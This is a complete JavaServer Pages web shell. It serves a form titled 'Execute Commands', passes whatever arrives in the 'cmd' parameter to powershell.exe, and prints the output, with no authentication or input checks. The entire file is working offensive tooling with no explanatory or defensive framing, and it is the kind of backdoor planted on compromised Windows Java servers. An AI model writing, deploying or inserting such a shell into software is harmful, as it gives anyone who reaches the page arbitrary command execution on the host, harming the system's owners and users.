<%@ page import="java.io.IOException,java.io.InputStreamReader,java.io.BufferedReader" %>
<h1>Execute Commands</h1>

<form method="post">
Command
<input type="text" name="cmd">
<input type="submit" name="Execute" value="Execute">
</form>
<p>
<hr>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    ProcessBuilder processBuilder = new ProcessBuilder();
    processBuilder.command("powershell.exe", "-Command", cmd);

    try {

        Process process = processBuilder.start();

        StringBuilder output = new StringBuilder();

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));

        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line + "\n");
        }

        int exitVal = process.waitFor();
        if (exitVal == 0) {
            out.print(output);
        } else {
            out.print("Failed");
        }

    } catch (IOException e) {
        e.printStackTrace();
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
}
%>